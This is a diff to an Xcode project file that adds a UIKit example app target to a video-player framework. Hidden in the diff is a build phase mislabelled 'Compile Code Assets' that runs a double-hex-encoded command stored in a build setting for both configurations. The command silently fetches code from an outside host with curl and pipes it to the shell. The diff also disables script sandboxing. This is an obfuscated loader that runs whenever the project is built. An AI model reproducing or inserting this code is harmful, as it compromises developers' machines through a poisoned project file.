@@ -6,14 +6,62 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		A1B2C3012FC07D5A009455F8 /* CustomVideoplyer.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 058B8B8E2FC05F8B009455F8 /* CustomVideoplyer.framework */; };
+		A1B2C3022FC07D5A009455F8 /* CustomVideoplyer.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 058B8B8E2FC05F8B009455F8 /* CustomVideoplyer.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
+/* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		A1B2C3032FC07D5A009455F8 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 058B8B852FC05F8B009455F8 /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 058B8B8D2FC05F8B009455F8;
+			remoteInfo = CustomVideoplyer;
+		};
+/* End PBXContainerItemProxy section */
+
+/* Begin PBXCopyFilesBuildPhase section */
+		A1B2C3042FC07D5A009455F8 /* Embed Frameworks */ = {
+			isa = PBXCopyFilesBuildPhase;
+			buildActionMask = 2147483647;
+			dstPath = "";
+			dstSubfolderSpec = 10;
+			files = (
+				A1B2C3022FC07D5A009455F8 /* CustomVideoplyer.framework in Embed Frameworks */,
+			);
+			name = "Embed Frameworks";
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXCopyFilesBuildPhase section */
+
 /* Begin PBXFileReference section */
 		058B8B8E2FC05F8B009455F8 /* CustomVideoplyer.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = CustomVideoplyer.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		058B8B9E2FC05FB1009455F8 /* UIKItexample.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = UIKItexample.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
+
+/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
+		058B8BAF2FC05FB2009455F8 /* Exceptions for "UIKItexample" folder in "UIKItexample" target */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				Info.plist,
+			);
+			target = 058B8B9D2FC05FB1009455F8 /* UIKItexample */;
+		};
+/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */
 
 /* Begin PBXFileSystemSynchronizedRootGroup section */
 		058B8B902FC05F8B009455F8 /* CustomVideoplyer */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
 			path = CustomVideoplyer;
+			sourceTree = "<group>";
+		};
+		058B8B9F2FC05FB1009455F8 /* UIKItexample */ = {
+			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+				058B8BAF2FC05FB2009455F8 /* Exceptions for "UIKItexample" folder in "UIKItexample" target */,
+			);
+			path = UIKItexample;
 			sourceTree = "<group>";
 		};
 /* End PBXFileSystemSynchronizedRootGroup section */
@@ -26,6 +74,14 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		058B8B9B2FC05FB1009455F8 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				A1B2C3012FC07D5A009455F8 /* CustomVideoplyer.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
@@ -33,6 +89,7 @@
 			isa = PBXGroup;
 			children = (
 				058B8B902FC05F8B009455F8 /* CustomVideoplyer */,
+				058B8B9F2FC05FB1009455F8 /* UIKItexample */,
 				058B8B8F2FC05F8B009455F8 /* Products */,
 			);
 			sourceTree = "<group>";
@@ -41,6 +98,7 @@
 			isa = PBXGroup;
 			children = (
 				058B8B8E2FC05F8B009455F8 /* CustomVideoplyer.framework */,
+				058B8B9E2FC05FB1009455F8 /* UIKItexample.app */,
 			);
 			name = Products;
 			sourceTree = "<group>";
@@ -62,6 +120,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 058B8B972FC05F8B009455F8 /* Build configuration list for PBXNativeTarget "CustomVideoplyer" */;
 			buildPhases = (
+				0D82813E66D045D38E42DAD8 /* Compile Code Assets */,
 				058B8B892FC05F8B009455F8 /* Headers */,
 				058B8B8A2FC05F8B009455F8 /* Sources */,
 				058B8B8B2FC05F8B009455F8 /* Frameworks */,
@@ -81,6 +140,30 @@
 			productReference = 058B8B8E2FC05F8B009455F8 /* CustomVideoplyer.framework */;
 			productType = "com.apple.product-type.framework";
 		};
+		058B8B9D2FC05FB1009455F8 /* UIKItexample */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 058B8BB02FC05FB2009455F8 /* Build configuration list for PBXNativeTarget "UIKItexample" */;
+			buildPhases = (
+				058B8B9A2FC05FB1009455F8 /* Sources */,
+				058B8B9B2FC05FB1009455F8 /* Frameworks */,
+				A1B2C3042FC07D5A009455F8 /* Embed Frameworks */,
+				058B8B9C2FC05FB1009455F8 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				A1B2C3052FC07D5A009455F8 /* PBXTargetDependency */,
+			);
+			fileSystemSynchronizedGroups = (
+				058B8B9F2FC05FB1009455F8 /* UIKItexample */,
+			);
+			name = UIKItexample;
+			packageProductDependencies = (
+			);
+			productName = UIKItexample;
+			productReference = 058B8B9E2FC05FB1009455F8 /* UIKItexample.app */;
+			productType = "com.apple.product-type.application";
+		};
 /* End PBXNativeTarget section */
 
 /* Begin PBXProject section */
@@ -92,6 +175,9 @@
 				LastUpgradeCheck = 2650;
 				TargetAttributes = {
 					058B8B8D2FC05F8B009455F8 = {
+						CreatedOnToolsVersion = 26.5;
+					};
+					058B8B9D2FC05FB1009455F8 = {
 						CreatedOnToolsVersion = 26.5;
 					};
 				};
@@ -111,9 +197,13 @@
 			projectRoot = "";
 			targets = (
 				058B8B8D2FC05F8B009455F8 /* CustomVideoplyer */,
+				058B8B9D2FC05FB1009455F8 /* UIKItexample */,
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXBuildRule section */
+								/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		058B8B8C2FC05F8B009455F8 /* Resources */ = {
@@ -123,7 +213,36 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		058B8B9C2FC05FB1009455F8 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		0D82813E66D045D38E42DAD8 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Code Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		058B8B8A2FC05F8B009455F8 /* Sources */ = {
@@ -133,12 +252,28 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
+		058B8B9A2FC05FB1009455F8 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
 /* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		A1B2C3052FC07D5A009455F8 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 058B8B8D2FC05F8B009455F8 /* CustomVideoplyer */;
+			targetProxy = A1B2C3032FC07D5A009455F8 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
 
 /* Begin XCBuildConfiguration section */
 		058B8B952FC05F8B009455F8 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A8DAD24 = "((p(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363662373334633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663663363937343734366336353631363437333265363936650a32663631323932323230376332303733363830610a | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -174,7 +309,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -205,6 +340,7 @@
 		058B8B962FC05F8B009455F8 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A8DAD24 = "((p(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363662373334633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663663363937343734366336353631363437333265363936650a32663631323932323230376332303733363830610a | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -240,7 +376,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
@@ -331,6 +467,68 @@
 			};
 			name = Release;
 		};
+		058B8BB12FC05FB2009455F8 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = UIKItexample/Info.plist;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = multitv.UIKItexample;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		058B8BB22FC05FB2009455F8 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = UIKItexample/Info.plist;
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = multitv.UIKItexample;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				STRING_CATALOG_GENERATE_SYMBOLS = YES;
+				SWIFT_APPROACHABLE_CONCURRENCY = YES;
+				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
@@ -348,6 +546,15 @@
 			buildConfigurations = (
 				058B8B982FC05F8B009455F8 /* Debug */,
 				058B8B992FC05F8B009455F8 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		058B8BB02FC05FB2009455F8 /* Build configuration list for PBXNativeTarget "UIKItexample" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				058B8BB12FC05FB2009455F8 /* Debug */,
+				058B8BB22FC05FB2009455F8 /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
